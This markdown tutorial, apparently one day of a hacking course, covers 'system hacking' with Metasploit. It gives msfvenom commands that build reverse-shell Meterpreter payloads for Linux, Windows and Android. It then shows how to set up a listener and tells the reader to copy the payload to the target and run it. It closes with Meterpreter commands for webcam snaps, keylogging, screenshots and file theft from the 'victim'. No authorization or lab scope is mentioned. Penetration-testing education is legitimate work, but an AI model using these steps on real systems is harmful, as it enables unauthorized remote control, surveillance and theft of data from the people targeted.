# Day 5 (SYSTEM HACKING)

### What is System Hacking?

System hacking is itself a vast subject which consists of hacking the different software based technological systems such as laptops, desktops, etc. System hacking is defined as the compromise of computer systems and software to gain access to the target computer and steal or misuse their sensitive information. Here the malicious hacker exploits the weaknesses in a computer system or network to gain unauthorized access of its data or take illegal advantage of it.

### Tools Used

**Metasploit** : Metasploit is an open source cyber-security project that allows infosec professionals to use different penetration testing tools to discover remote software vulnerabilities. It also functions as an exploit module development platform.


### Hands on 
#### 1. Creating Metasploit Payloads(Files)
##### List payloads
```sh
msfvenom -l
```
##### Binaries
###### Linux
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf -o shell.elf
```
###### Windows
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -o shell.exe
```
###### Android
```sh
msfvenom -p android/meterpreter/reverse_tcp -f apk LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f apk  -o shell.apk
```

#### 2. Setup Listener (Handler)
First open MSFCONSOLE, use the following command to open the metasploit console :

```sh
msfconsole
```
Once the console has started you need to create an appropriate handler to communicate with your payloads.
Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Initialize the handler using the following commands.

```sh
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
exploit -i -j
```

#### 3. Execute the Payload
Copy the payload file to our target system and execute the file. The executable causes the payload to be executed and connect back to the attacking machine (Kali Linux). Immediately, we receive a Meterpreter session on our Kali Linux. This is demonstrated by the Meterpreter > prompt as `Meterpreter session 1 opened `. Now we have a shell on the victim machine.

#### 4. Basic Commands on Meterpreter

To connect to a particular session type

```sh
sessions -i <sessions id which is open>
```

##### List of Basic Commands

1. **?** : Help menu
2. **shell** : The shell command will present you with a standard shell on the target system.
3. **webcam_list** : The webcam_list command when run from the Meterpreter shell, will display currently available web cams on the target host.
4. **webcam_snap** : The webcam_snap command grabs a picture from a connected web cam on the target system
```webcam_snap -i 1```
5. **keyscan_dump** : dumps the contents of the software keylogger
6. **keyscan_start** : starts the software keylogger when associated with a process such as Word or browser
7. **keyscan_stop** : stops the software keylogger
8. **screenshot** : grabs a screenshot of the meterpreter desktop
9. **download** : download a file from the victim system to the attacker system
10 . **upload** : upload a file from the attacker system to the victim

### Further Reading

1. [Metasploit](https://www.youtube.com/watch?v=Y6NI12OAMWc&list=PLF23494E2820B442B)
